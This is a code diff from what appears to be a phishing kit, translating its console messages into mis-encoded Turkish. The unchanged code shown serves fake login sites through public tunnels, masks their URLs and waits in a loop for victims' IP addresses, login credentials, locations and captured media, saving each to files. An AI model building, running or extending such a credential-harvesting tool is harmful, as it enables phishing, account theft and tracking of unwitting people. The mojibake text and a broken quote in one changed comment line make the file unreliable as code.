@@ -266,7 +266,7 @@ else:
     saved_file = f"{home}/.creds.txt"
 
 
-print(f"\n{info}Please wait!{nc}")
+print(f"\n{info}LÃ¼tfen bekleyin!{nc}")
 
 
 default_port = 8080
@@ -743,11 +743,11 @@ def download(url, path):
         except Exception as e:
             remove(path)
             append(e, error_file)
-            print(f"\n{error}Download failed due to: {str(e)}")
-            print(f"\n{info}Retrying {i}/{retry}{nc}")
+            print(f"\n{error}Ä°ndirme baÅŸarÄ±sÄ±z oldu. Sebep: {str(e)}")
+            print(f"\n{info}Yeniden deneniyor {i}/{retry}{nc}")
             sleep(1)
     if not isfile(path):
-        print(f"\n{error}Download failed permanently!")
+        print(f"\n{error}Ä°ndirme tamamen baÅŸarÄ±sÄ±z oldu!")
         pexit()
 
 
@@ -757,7 +757,7 @@ def extract(filename, extract_path='.', pwd=None):
     newfile = filename.split(".")[0] if "." in filename else filename
     if directory!="" and not isdir(directory):
         mkdir(directory)
-    print(f"\n{info}Extracting {green}{newfile.title()}{nc}...\n")
+    print(f"\n{info}Ã‡Ä±kartÄ±lÄ±yor: {green}{newfile.title()}{nc}...\n")
     try:
         if ".zip" in filename:
             with ZipFile(filename, 'r') as zip_ref:
@@ -768,11 +768,11 @@ def extract(filename, extract_path='.', pwd=None):
                         try:
                             zip_ref.extractall(extract_path, pwd=bytes(pwd, "utf-8"))
                         except:
-                            print(f"\n{error}Wrong password!")
+                            print(f"\n{error}HatalÄ± ÅŸifre!")
                             delete(filename)
                             exit()
                 except:
-                    print(f"\n{error}Zip file corrupted!")
+                    print(f"\n{error}Zip dosyasÄ± bozuk!")
                     delete(filename)
                     exit()
             return
@@ -835,7 +835,7 @@ def write_redirect():
 # Polite Exit
 def pexit():
     killer()
-    sprint(f"\n{info2}Thanks for using!\n{nc}")
+    sprint(f"\n{info2}KullandÄ±ÄŸÄ±n iÃ§in teÅŸekkÃ¼rler!\n{nc}")
     exit(0)
 
 
@@ -942,7 +942,7 @@ def url_manager(url, tunneler):
         )
     )
     #print(f"\n{info2}{arg1} > {yellow}{url}")
-    #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
+    #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','")}")
     sleep(0.5)
 
 def shortener1(url):
@@ -1015,9 +1015,9 @@ def customfol():
 # Show saved data from saved file with small decoration
 def saved():
     clear()
-    print(f"\n{info}Saved details: \n{nc}")
+    print(f"\n{info}Kaydedilen bilgiler: \n{nc}")
     show_file_data(saved_file)
-    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
+    print(f"\n{green}[{white}0{green}]{yellow} Ã‡Ä±kÄ±ÅŸ                     {green}[{white}x{green}]{yellow} Ana MenÃ¼       \n")
     inp = input(f"\n{ask}Choose your option: {green}")
     if inp == "0":
         pexit()
@@ -1034,7 +1034,7 @@ def about():
     print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Telegram {yellow}]     {cyan} : {yellow}[{green}https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
-    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
+    print(f"\n{green}[{white}0{green}]{yellow} Ã‡Ä±kÄ±ÅŸ                     {green}[{white}x{green}]{yellow} Ana MenÃ¼       \n")
     inp = input(f"\n{ask}Choose your option: {green}")
     if inp == "0":
         pexit()
@@ -1126,7 +1126,7 @@ def updater():
             print(f"\n{info}Updating cancelled. Using old version!")
             sleep(2)
         else:
-            print(f"\n{error}Wrong input!\n")
+            print(f"\n{error}GeÃ§ersiz giriÅŸ!\n")
             sleep(2)
 
 # Installing packages and downloading tunnelers
@@ -1232,11 +1232,11 @@ def requirements():
         lx_command = "localxpose"
     if isfile("websites.zip"):
         delete(sites_dir, recreate=True)
-        print(f"\n{info}Copying website files....")
+        print(f"\n{info}Site dosyalarÄ± kopyalanÄ±yor...")
         extract("websites.zip", sites_dir)
         remove("websites.zip")
     if isdir("sites"):
-        print(f"\n{info}Copying website files....")
+        print(f"\n{info}Site dosyalarÄ± kopyalanÄ±yor...")
         copy("sites", sites_dir)
     if isfile(f"{sites_dir}/version.txt"):
         with open(f"{sites_dir}/version.txt", "r") as sites_file:
@@ -1323,7 +1323,7 @@ def main_menu():
         elif choice == "0":
             pexit()
         else:
-            sprint(f"\n{error}Wrong input {bred}'{choice}'")
+            sprint(f"\n{error}GeÃ§ersiz giriÅŸ {bred}'{choice}'")
             ptype = None
 
 
@@ -1381,7 +1381,7 @@ def secondary_menu(sites, name):
         elif choice == "0":
             pexit()
         else:
-            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
+            sprint(f"\n{error}GeÃ§ersiz giriÅŸ {bred}\"{choice}\"")
             option = None
     if customdir is None:
         site = f"{sites_dir}/{folder}"
@@ -1435,11 +1435,11 @@ def server():
         append(e, error_file)
         status_code = 400
     if status_code <= 400:
-        sprint(f"\n{info}PHP Server has started successfully!")
+        sprint(f"\n{info}PHP sunucusu baÅŸarÄ±yla baÅŸlatÄ±ldÄ±!")
     else:
-        sprint(f"\n{error}PHP Error! Code: {status_code}")
+        sprint(f"\n{error}PHP HatasÄ±! Kod: {status_code}")
         pexit()
-    sprint(f"\n{info2}Initializing tunnelers at same address.....")
+    sprint(f"\n{info2}TÃ¼nelleyiciler baÅŸlatÄ±lÄ±yor...")
     internet()
     arguments = ""
     if region is not None:
@@ -1484,10 +1484,10 @@ def server():
         sleep(1)
     if cf_success or lx_success or lhr_success or svo_success:
         if mode == "test":
-            print(f"\n{info}URL generation has completed successfully!")
+            print(f"\n{info}URL baÅŸarÄ±yla oluÅŸturuldu!")
             print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
             pexit()
-        sprint(f"\n{info}Your urls are given below : \n")
+        sprint(f"\n{info}BaÄŸlantÄ±larÄ±nÄ±z aÅŸaÄŸÄ±da: \n")
         if cf_success:
             url_manager(cf_url, "CloudFlared")
         if lx_success:
@@ -1507,7 +1507,7 @@ def server():
         else:
             print(f"\n{error}URL masking not available for {tunneler}!{nc}")
     else:
-        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
+        sprint(f"\n{error}TÃ¼nel baÅŸarÄ±sÄ±z! Kendi servisinizi kullanÄ±n. Port: {port}!{nc}")
         if mode == "test":
             exit(1)
     waiter()
@@ -1518,21 +1518,21 @@ def waiter():
     delete(ip_file, cred_file, log_file)
     for file in get_media():
         remove(file)
-    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
+    sprint(f"\n{info}{blue}GiriÅŸ bilgileri bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
     try:
         while True:
             if isfile(ip_file):
-                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
+                print(f"\n\n{success}{bgreen}Hedef IP adresi bulundu!\n\007")
                 show_file_data(ip_file)
                 ipdata = cat(ip_file)
                 append(ipdata, main_ip)
                 # Just add the ip
                 append(ipdata.split("\n")[0], saved_file)
-                print(f"\n{info2}Saved in {main_ip}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info2}Kaydedildi: {main_ip}")
+                print(f"\n{info}{blue}Sonraki bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
                 remove(ip_file)
             if isfile(cred_file):
-                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
+                print(f"\n\n{success}{bgreen}Hedef giriÅŸ bilgileri bulundu!\n\007")
                 show_file_data(cred_file)
                 userdata = cat(cred_file)
                 if is_mail_ok:
@@ -1540,34 +1540,34 @@ def waiter():
                 append(userdata, main_cred)
                 append(userdata, saved_file)
                 add_json(text2json(userdata), cred_json)
-                print(f"\n{info2}Saved in {main_cred}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info2}Kaydedildi: {main_cred}")
+                print(f"\n{info}{blue}Sonraki bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
                 remove(cred_file)
             if isfile(info_file):
-                print(f"\n\n{success}{bgreen}Victim Info found!\n\007")
+                print(f"\n\n{success}{bgreen}Hedef bilgisi bulundu!\n\007")
                 show_file_data(info_file)
                 info_data = cat(info_file)
                 append(info_data, main_info)
                 add_json(text2json(info_data), info_json)
-                print(f"\n{info2}Saved in {main_info}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info2}Kaydedildi: {main_info}")
+                print(f"\n{info}{blue}Sonraki bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
                 remove(info_file)
             if isfile(location_file):
-                print(f"\n\n{success}{bgreen}Victim Location found!\n\007")
+                print(f"\n\n{success}{bgreen}Hedef konumu bulundu!\n\007")
                 show_file_data(location_file)
                 location_data = cat(location_file)
                 append(location_data, main_location)
                 add_json(text2json(location_data), location_json)
-                print(f"\n{info2}Saved in {main_location}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info2}Kaydedildi: {main_location}")
+                print(f"\n{info}{blue}Sonraki bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
                 remove(location_file)
             if isfile(log_file):
-                print(f"\n{success}{bgreen}Media file captured!\007")
+                print(f"\n{success}{bgreen}Medya dosyasÄ± alÄ±ndÄ±!\007")
                 for file in get_media():
                     copy(file, directory)
                     remove(file)
                     print(f"\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}")
-                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
+                print(f"\n{info}{blue}Sonraki bekleniyor...{cyan}Press {red}Ctrl+C{cyan} to exit")
                 if not get_media():
                     remove(log_file)
             sleep(0.75)
